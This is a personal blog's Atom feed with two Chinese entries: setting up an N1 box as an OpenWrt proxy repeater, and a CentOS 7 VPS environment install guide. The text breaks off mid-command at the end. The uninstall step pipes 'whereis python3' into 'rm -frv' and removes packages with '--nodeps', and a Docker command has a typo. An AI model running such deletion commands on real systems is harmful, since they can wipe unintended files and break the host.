<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>丰梓林的博客</title>
  <icon>https://fz1lin.com/icon.png</icon>
  <subtitle>想做一个剑客，但手里没有合适的剑</subtitle>
  <link href="https://fz1lin.com/atom.xml" rel="self"/>
  
  <link href="https://fz1lin.com/"/>
  <updated>2022-05-15T08:44:01.659Z</updated>
  <id>https://fz1lin.com/</id>
  
  <author>
    <name>fz1lin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>N1 软路由刷 openwrt</title>
    <link href="https://fz1lin.com/2022/1386849462/"/>
    <id>https://fz1lin.com/2022/1386849462/</id>
    <published>2022-05-15T08:23:53.000Z</published>
    <updated>2022-05-15T08:44:01.659Z</updated>
    
    <content type="html"><![CDATA[<p>解决问题：</p><p>用于出差随身携带，实现科学上网，所有流量走路由器，而不是本机代理，有些扫描器或者软件，权限高，不走全局代理，容易漏IP，因此我们需要从路由上解决，也可以使用openwrt走旁路由，不过本教程只是中继，后续出旁路由吧，本教程仅用于安全研究以技术交流，造成的后果使用者负责。</p><p>设备：斐讯 N1</p><h2 id="N1-刷openwrt-x20"><a href="#N1-刷openwrt-x20" class="headerlink" title="N1 刷openwrt&#x20;"></a>N1 刷openwrt&#x20;</h2><p>固件：<a href="https://www.aliyundrive.com/s/KhSCHkTZeei" title="https://www.aliyundrive.com/s/KhSCHkTZeei">https://www.aliyundrive.com/s/KhSCHkTZeei</a>   提取码: 34ei</p><p>N1刷openwrt教程：<a href="http://readme.jimostudio.link:9000/?id=57" title="http://readme.jimostudio.link:9000/?id=57">http://readme.jimostudio.link:9000/?id=57</a></p><h2 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h2><p><img src="/2022/1386849462/N1%E6%8B%93%E6%89%91%E5%9B%BE_2lqmA54YCH.png"></p><h2 id="N1-软路由无线中继模式"><a href="#N1-软路由无线中继模式" class="headerlink" title="N1 软路由无线中继模式"></a>N1 软路由无线中继模式</h2><p>进入后台</p><p><a href="http://192.168.1.100/cgi-bin/luci/" title="http://192.168.1.100/">http://192.168.1.100/</a></p><p>账号 root 密码password</p><p>无线中继模式</p><p>点击扫描</p><p><img src="/2022/1386849462/image_U6B37R4C2w.png"></p><p>加入网络</p><p><img src="/2022/1386849462/image_C0O29wzD14.png"></p><p>输入密码-提交</p><p><img src="/2022/1386849462/image_-lLoSzcQzW.png"></p><p>选择接口 LAN 也就是网线的那个口，设置DNS 访问百度测试</p><p><img src="/2022/1386849462/image_4xNFMVx9Ky.png"></p><p>测试成功说明路由走路由器了</p><h2 id="科学上网"><a href="#科学上网" class="headerlink" title="科学上网"></a>科学上网</h2><p><img src="/2022/1386849462/image_CNNX3hA7-u.png"></p><p>需要自己准备机场列表</p><p>点击添加-启用勾选-备注随便填-把订阅连接添加上面-保存应用-手动订阅</p><p><img src="/2022/1386849462/image_kI3glymSHL.png"></p><p>主开关勾选 -选择自己机场的节点</p><p><img src="/2022/1386849462/image_M4MHkVycxc.png"></p><p>这里根据自己的喜好，更改代理模式</p><p><img src="/2022/1386849462/image_w7Xsim2z1Z.png"></p><p>访问 <a href="http://ip111.cn/" title="http://ip111.cn/">http://ip111.cn/</a></p><p><img src="/2022/1386849462/image_AfGPD46ypu.png"></p><h2 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h2><p>如果未生效重启一下路由或者禁用启用一下网卡</p>]]></content>
    
    
    <summary type="html">告别windows 走本地代理，实现路由器走全局代理，中继模式，出差便携</summary>
    
    
    
    <category term="软路由" scheme="https://fz1lin.com/categories/%E8%BD%AF%E8%B7%AF%E7%94%B1/"/>
    
    
    <category term="N1" scheme="https://fz1lin.com/tags/N1/"/>
    
    <category term="Router" scheme="https://fz1lin.com/tags/Router/"/>
    
    <category term="openwrt" scheme="https://fz1lin.com/tags/openwrt/"/>
    
  </entry>
  
  <entry>
    <title>vps 常用环境安装</title>
    <link href="https://fz1lin.com/2022/2917416115/"/>
    <id>https://fz1lin.com/2022/2917416115/</id>
    <published>2022-03-31T11:14:11.000Z</published>
    <updated>2022-05-15T08:21:49.831Z</updated>
    
    <content type="html"><![CDATA[<p>版本 v 2.0 –添加 java 8 java 7 安装，python 扩展包</p><h2 id="必看"><a href="#必看" class="headerlink" title="必看"></a>必看</h2><p>本安装系统适用于 centos 7 系列</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/redhat-release</span><br><span class="line">centos 7</span><br></pre></td></tr></table></figure><p>所有安装环境只根据个人需要进行安装，无需全部安装，会持续添加，修订 ~~</p><p>source /etc/profile  编译后只能在当前终端生效，重新开启一个中断后，该环境变量将失效。解决办法，重启 <code>reboot</code>、即可永久生效</p><h2 id="Linux配置ssh"><a href="#Linux配置ssh" class="headerlink" title="Linux配置ssh"></a>Linux配置ssh</h2><p>1.vnc配置ssh连接</p><ul><li><p>  按照要求进行配置</p></li><li><p>  进行连接</p></li></ul><p>2.ssh连接</p><ul><li><p>配置ssh配置文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/ssh/ssh_config</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改ssh配置文件</span></span><br><span class="line"><span class="comment"># Port 22 去掉注释</span></span><br><span class="line">Port <span class="number">22</span></span><br><span class="line"><span class="comment">#------------------------分割线---------------------------</span></span><br><span class="line"><span class="comment">#PermitLocalCommand no #去掉注释并改为</span></span><br><span class="line">PermitLocalCommand yes</span><br></pre></td></tr></table></figure><ul><li>  退出保存即可</li></ul></li></ul><p>3.连接ssh</p><p>输入密码和用户即可</p><h2 id="Yum-源"><a href="#Yum-源" class="headerlink" title="Yum 源"></a>Yum 源</h2><p>国外的服务可忽略</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yum install -y wget</span><br><span class="line"><span class="built_in">cd</span> /etc/yum.repos.d</span><br><span class="line">mv CentOS-Base.repo CentOS-Base.repo.bk</span><br><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-7.repo</span><br><span class="line">yum clean all &amp;&amp; yum makecache</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其他源</p><p>清华源 <a href="https://mirrors.tuna.tsinghua.edu.cn/help/centos/" title="https://mirrors.tuna.tsinghua.edu.cn/help/centos/">https://mirrors.tuna.tsinghua.edu.cn/help/centos/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 网易源</span></span><br><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.163.com/.<span class="built_in">help</span>/CentOS7-Base-163.repo</span><br><span class="line"></span><br><span class="line"><span class="comment"># 中科大</span></span><br><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo <span class="string">&#x27;https://lug.ustc.edu.cn/wiki/_export/code/mirrors/help/centos?codeblock=3&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Linux-最小化工具库"><a href="#Linux-最小化工具库" class="headerlink" title="Linux 最小化工具库"></a>Linux 最小化工具库</h2><p>因为是最小化安装，所以好多常用工具需要自行安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y vim lrzsz gcc gcc-c++ net-tools wget automake cmake gzip bzip2 zip unzip kernel kernel-devel kernel-headers git-all screen </span><br></pre></td></tr></table></figure><h2 id="Java-环境"><a href="#Java-环境" class="headerlink" title="Java 环境"></a>Java 环境</h2><p>安装多个Java版本是可以切换的，没有测试在运行程序，切换版本，会不会出现故障，最好测试一下，目前本地测试服务未出现故障，没有跑服务，自测吧，可以根据需要进行安装</p><h3 id="Java11"><a href="#Java11" class="headerlink" title="Java11"></a>Java11</h3><p>1.安装java环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">wget https://download.java.net/openjdk/jdk11/ri/openjdk-11+28_linux-x64_bin.tar.gz</span><br><span class="line">mkdir /opt/java</span><br><span class="line">tar zxvf openjdk-11+28_linux-x64_bin.tar.gz -C /opt/java</span><br><span class="line"></span><br><span class="line">vim  /etc/profile</span><br><span class="line"></span><br><span class="line"><span class="comment"># java 11</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/opt/java/jdk-11</span><br><span class="line"><span class="built_in">export</span> JRE_HOME=/opt/java/jdk-11</span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$&#123;JAVA_HOME&#125;</span>/lib:<span class="variable">$&#123;JRE_HOME&#125;</span>/lib</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$&#123;PATH&#125;</span>:<span class="variable">$&#123;JAVA_HOME&#125;</span>/bin:<span class="variable">$&#123;JRE_HOME&#125;</span>/bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载源</span></span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Java8"><a href="#Java8" class="headerlink" title="Java8"></a>Java8</h3><p>yum安装</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install java-<span class="number">1.8</span><span class="number">.0</span>-openjdk.x86_64</span><br></pre></td></tr></table></figure><p>源码安装-jdk-8u77</p><p><a href="https://www.oracle.com/tw/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/tw/java/technologies/javase/javase8-archive-downloads.html</a></p><p>需要自己下载源码、官网下载需要注册登录下载，1.8之后的，可自行注册下载，所需版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mkdir /opt/java</span><br><span class="line">tar zxvf jdk-8u77-linux-x64.tar.gz -C /opt/java</span><br><span class="line"></span><br><span class="line">vim  /etc/profile</span><br><span class="line"></span><br><span class="line"><span class="comment"># java 8</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/opt/java/jdk1.8.0_77</span><br><span class="line"><span class="built_in">export</span> JRE_HOME=/opt/java/jdk1.8.0_77</span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$&#123;JAVA_HOME&#125;</span>/lib:<span class="variable">$&#123;JRE_HOME&#125;</span>/lib</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$&#123;PATH&#125;</span>:<span class="variable">$&#123;JAVA_HOME&#125;</span>/bin:<span class="variable">$&#123;JRE_HOME&#125;</span>/bin</span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Java7"><a href="#Java7" class="headerlink" title="Java7"></a>Java7</h3><p><a href="https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mkdir /opt/java</span><br><span class="line">tar zxvf jdk-7u80-linux-x64.tar.gz -C /opt/java</span><br><span class="line"></span><br><span class="line">vim  /etc/profile</span><br><span class="line"></span><br><span class="line"><span class="comment"># java 7</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/opt/java/jdk1.7.0_80</span><br><span class="line"><span class="built_in">export</span> JRE_HOME=/opt/java/jdk1.7.0_80</span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$&#123;JAVA_HOME&#125;</span>/lib:<span class="variable">$&#123;JRE_HOME&#125;</span>/lib</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$&#123;PATH&#125;</span>:<span class="variable">$&#123;JAVA_HOME&#125;</span>/bin:<span class="variable">$&#123;JRE_HOME&#125;</span>/bin</span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure><h3 id="Java切换JDK-版本"><a href="#Java切换JDK-版本" class="headerlink" title="Java切换JDK 版本"></a>Java切换JDK 版本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将Java目录加入JDK选择列表</span></span><br><span class="line">update-alternatives  --install  /usr/bin/java  java  /opt/java/jdk-11/bin/java  11</span><br><span class="line">update-alternatives  --install  /usr/bin/java  java  /opt/java/jdk1.8.0_77/bin/java  8</span><br><span class="line">update-alternatives  --install  /usr/bin/java  java  /opt/java/jdk1.7.0_80/bin/java  7</span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换版本选择需要jdk的版本</span></span><br><span class="line">update-alternatives  --config  java     </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="maven"><a href="#maven" class="headerlink" title="maven"></a>maven</h3><p>安装Java打包程序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget https:<span class="comment">//dlcdn.apache.org/maven/maven-3/3.8.5/binaries/apache-maven-3.8.5-bin.tar.gz</span></span><br><span class="line">tar -xvf  apache-maven-<span class="number">3.8</span><span class="number">.5</span>-bin.tar.gz</span><br><span class="line">mv -f apache-maven-<span class="number">3.8</span><span class="number">.5</span> /usr/local/</span><br><span class="line">rm -rf apache-maven-<span class="number">3.8</span><span class="number">.5</span>-bin.tar.gz</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>添加环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/profile</span><br><span class="line"></span><br><span class="line"><span class="comment"># maven</span></span><br><span class="line"><span class="built_in">export</span> MAVEN_HOME=/usr/<span class="built_in">local</span>/apache-maven-3.8.5</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$&#123;PATH&#125;</span>:<span class="variable">$&#123;MAVEN_HOME&#125;</span>/bin</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">source /etc/profile</span><br><span class="line">mvn -v</span><br></pre></td></tr></table></figure><h2 id="Python-3-9-7"><a href="#Python-3-9-7" class="headerlink" title="Python 3.9.7"></a>Python 3.9.7</h2><p>Linux 安装</p><p>1.查看Python 版本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -V</span><br><span class="line"><span class="comment"># CentOS 7 中自带的python版本是python-2.7.5 ,python是3.6的很多版本需要3.7的所需需要安装高版本，</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2.下载安装</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.python.org/ftp/python/<span class="number">3.9</span><span class="number">.7</span>/Python-<span class="number">3.9</span><span class="number">.7</span>.tar.xz</span><br><span class="line">tar -xvJf Python-<span class="number">3.9</span><span class="number">.7</span>.tar.xz</span><br><span class="line">yum install -y zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gcc  libffi-devel</span><br><span class="line">cd Python-<span class="number">3.9</span><span class="number">.7</span></span><br><span class="line">./configure --prefix=/usr/local/python3</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">rm -rf Python-<span class="number">3.9</span><span class="number">.7</span>.tar.xz Python-<span class="number">3.9</span><span class="number">.7</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载</span></span><br><span class="line"><span class="comment"># 解压</span></span><br><span class="line"><span class="comment"># 安装依赖包</span></span><br><span class="line"><span class="comment"># 进入python目录</span></span><br><span class="line"><span class="comment"># 编译</span></span><br><span class="line"><span class="comment"># 安装</span></span><br></pre></td></tr></table></figure><p>3.创建链接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ln -s /usr/local/python3/<span class="built_in">bin</span>/python3<span class="number">.9</span> /usr/<span class="built_in">bin</span>/python3</span><br><span class="line">ln -s /usr/local/python3/<span class="built_in">bin</span>/pip3<span class="number">.9</span> /usr/<span class="built_in">bin</span>/pip3</span><br><span class="line"><span class="comment"># 创建python3链接</span></span><br><span class="line"><span class="comment"># 创建pip3链接</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#更新 pip</span></span><br><span class="line">/usr/local/python3/<span class="built_in">bin</span>/python3<span class="number">.9</span> -m pip install --upgrade pip</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>4.修改yum配置（可选）</p><p>因为执行yum需要python2版本，所以我们还要修改yum的配置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/<span class="built_in">bin</span>/yum</span><br><span class="line"><span class="comment">#! /usr/bin/python修改为#! /usr/bin/python2</span></span><br><span class="line">vim /usr/libexec/urlgrabber-ext-down</span><br><span class="line"><span class="comment">#! /usr/bin/python 也要修改为#! /usr/bin/python2</span></span><br></pre></td></tr></table></figure><p>5.创建虚拟环境（可选）</p><p><a href="https://www.huaweicloud.com/articles/0cd569e4f8aab86e7f4ec3be6adce8fb.html" title="virtualenv">virtualenv</a> 是一个可以在同一计算机中隔离多个python版本的工具。如 python2.7 / python3.9 ，但是如果都装到一起，经常会导致问题。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip3 install --upgrade pip</span><br><span class="line">pip3 install virtualenv</span><br><span class="line">pip3 install virtualenvwrapper</span><br></pre></td></tr></table></figure><p>修改文件路径</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.bashrc</span><br><span class="line"><span class="comment">#在文件末尾添加</span></span><br><span class="line">VIRTUALENVWRAPPER_PYTHON=/usr/local/python3/<span class="built_in">bin</span>/python3 <span class="comment"># 指定virtualenvwrapper执行的python版本</span></span><br><span class="line">export WORKON_HOME=$HOME/.virtualenvs <span class="comment"># 指定虚拟环境存放目录，.virtualenvs目录名可自拟</span></span><br><span class="line">source /usr/local/python3/<span class="built_in">bin</span>/virtualenvwrapper.sh <span class="comment"># virtualenvwrapper.sh所在目录</span></span><br></pre></td></tr></table></figure><p>安装virtualenv</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">source ~/.bashrc</span><br><span class="line">ln -s /usr/local/python3/<span class="built_in">bin</span>/virtualenv /usr/local/<span class="built_in">bin</span>/virtualenv</span><br><span class="line">mkvirtualenv --python=/usr/<span class="built_in">bin</span>/python3 py3-env</span><br></pre></td></tr></table></figure><p>6.卸载 Python3 （可选）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#卸载pyhton3</span></span><br><span class="line">rpm -qa|grep python3|xargs rpm -ev --allmatches --nodeps</span><br><span class="line"></span><br><span class="line"><span class="comment">#删除所有残余文件</span></span><br><span class="line">whereis python3 |xargs rm -frv</span><br><span class="line"><span class="comment">#卸载完成</span></span><br><span class="line"><span class="comment">#查看现有的已安装的python</span></span><br><span class="line">whereis python</span><br></pre></td></tr></table></figure><h2 id="Python-2-扩展"><a href="#Python-2-扩展" class="headerlink" title="Python 2 扩展"></a>Python 2 扩展</h2><p>Centos7 默认自带 Python 2.7.5 版本，但是缺少 pip库 以及常用的模块，这里列举了，模块的安装方式，如果pip 安装不成功，可以尝试通过去官网下载编译安装</p><p>Python2的常用的库   <a href="https://pypi.org/" title="https://pypi.org/">https://pypi.org/</a></p><p>安装方式列举</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装 setuptools</span></span><br><span class="line">wget https://pypi.python.org/packages/<span class="number">45</span>/<span class="number">29</span>/8814bf414e7cd1031e1a3c8a4169218376e284ea2553cc0822a6ea1c2d78/setuptools-<span class="number">36.6</span><span class="number">.0</span>.<span class="built_in">zip</span><span class="comment">#md5=74663b15117d9a2cc5295d76011e6fd1</span></span><br><span class="line">unzip setuptools-<span class="number">36.6</span><span class="number">.0</span>.<span class="built_in">zip</span> </span><br><span class="line">cd setuptools-<span class="number">36.6</span><span class="number">.0</span></span><br><span class="line">python setup.py install</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装 requests</span></span><br><span class="line">wget https://pypi.python.org/packages/5b/0b/34be574b1ec997247796e5d516f3a6b6509c4e064f2885a96ed885ce7579/requests-<span class="number">2.12</span><span class="number">.4</span>.tar.gz</span><br><span class="line">tar -zxvf requests-<span class="number">2.12</span><span class="number">.4</span>.tar.gz</span><br><span class="line">cd requests-<span class="number">2.12</span><span class="number">.4</span></span><br><span class="line">python setup.py install</span><br><span class="line">rm -rf requests-<span class="number">2.12</span><span class="number">.4</span>.tar.gz requests-<span class="number">2.12</span><span class="number">.4</span></span><br></pre></td></tr></table></figure><p>安装 pip</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget https://pypi.python.org/packages/<span class="number">11</span>/b6/abcb525026a4be042b486df43905d6893fb04f05aac21c32c638e939e447/pip-<span class="number">9.0</span><span class="number">.1</span>.tar.gz<span class="comment">#md5=35f01da33009719497f01a4ba69d63c9</span></span><br><span class="line">tar -zxvf pip-<span class="number">9.0</span><span class="number">.1</span>.tar.gz</span><br><span class="line">cd pip-<span class="number">9.0</span><span class="number">.1</span></span><br><span class="line">python setup.py install</span><br><span class="line">pip install --upgrade pip</span><br><span class="line">rm -rf pip-<span class="number">9.0</span><span class="number">.1</span>.tar.gz pip-<span class="number">9.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure><h2 id="PHP-环境安装"><a href="#PHP-环境安装" class="headerlink" title="PHP 环境安装"></a>PHP 环境安装</h2><h3 id="PHP7-3-x20"><a href="#PHP7-3-x20" class="headerlink" title="PHP7.3&#x20;"></a>PHP7.3&#x20;</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yum install -y epel-release yum-utils</span><br><span class="line">yum install -y http://rpms.remirepo.net/enterprise/remi-release-7.rpm</span><br><span class="line">yum install -y php73-php-fpm php73-php-cli php73-php-bcmath php73-php-gd php73-php-json php73-php-mbstring php73-php-mcrypt php73-php-mysqlnd php73-php-opcache php73-php-pdo php73-php-pecl-crypto php73-php-pecl-mcrypt php73-php-pecl-geoip php73-php-pecl-swoole php73-php-recode php73-php-snmp php73-php-soap php73-php-xmll</span><br><span class="line">ln -s /opt/remi/php73/root/usr/bin/php /usr/bin/php</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Go环境"><a href="#Go环境" class="headerlink" title="Go环境"></a>Go环境</h2><h3 id="1-Linux"><a href="#1-Linux" class="headerlink" title="1.Linux"></a>1.Linux</h3><p>go 官网 ：<a href="https://golang.org/dl/" title="https://golang.org/dl/">https://golang.org/dl/</a></p><p>安装教程：<a href="https://www.runoob.com/go/go-environment.html" title="https://www.runoob.com/go/go-environment.html">https://www.runoob.com/go/go-environment.html</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">wget https://golang.org/dl/go1.17.linux-amd64.tar.gz</span><br><span class="line">tar -C /usr/<span class="built_in">local</span> -xzf go1.17.linux-amd64.tar.gz</span><br><span class="line">rm -rf go1.17.linux-amd64.tar.gz go1.17.linux-amd64</span><br><span class="line"></span><br><span class="line">vim /etc/profile</span><br><span class="line"></span><br><span class="line"><span class="comment"># go</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="string">&quot;<span class="variable">$PATH</span>:/usr/local/go/bin&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>设置国内代理 !!!!    VPS在国外可忽略</p><p><a href="https://github.com/goproxy/goproxy.cn/blob/master/README.zh-CN.md" title="https://github.com/goproxy/goproxy.cn/blob/master/README.zh-CN.md">https://github.com/goproxy/goproxy.cn/blob/master/README.zh-CN.md</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> GO111MODULE=on</span><br><span class="line"><span class="built_in">export</span> GOPROXY=https://goproxy.cn</span><br></pre></td></tr></table></figure><h3 id="2-windows"><a href="#2-windows" class="headerlink" title="2.windows"></a>2.windows</h3><p>在powershell运行，切换国内代理。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$env</span>:GO111MODULE = <span class="string">&quot;on&quot;</span></span><br><span class="line"><span class="variable">$env</span>:GOPROXY = <span class="string">&quot;https://goproxy.cn&quot;</span></span><br></pre></td></tr></table></figure><h2 id="Docker-环境"><a href="#Docker-环境" class="headerlink" title="Docker 环境"></a>Docker 环境</h2><p>1.检查版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/redhat-release</span><br></pre></td></tr></table></figure><p>2.安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">yum install -y gcc gcc-c++</span><br><span class="line">yum remove docker docker-client docker-client-latest docker-common docker-latest docker-latest-logrotate docker-logrotate docker-engine</span><br><span class="line">yum install -y yum-utils device-mapper-persistent-data lvm2 </span><br><span class="line">yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br><span class="line">yum makecache fast</span><br><span class="line">yum -y install docker-ce docker-ce-cli containerd.io docker-compose</span><br><span class="line">systemctl start docker</span><br><span class="line">systemctl e docker</span><br><span class="line">docker version</span><br><span class="line">docker run hello-world</span><br><span class="line">yum update -y</span><br><span class="line">curl -L https://github.com/docker/compose/releases/download/1.23.2/docker-compose-`uname -s`-`uname -m` -o 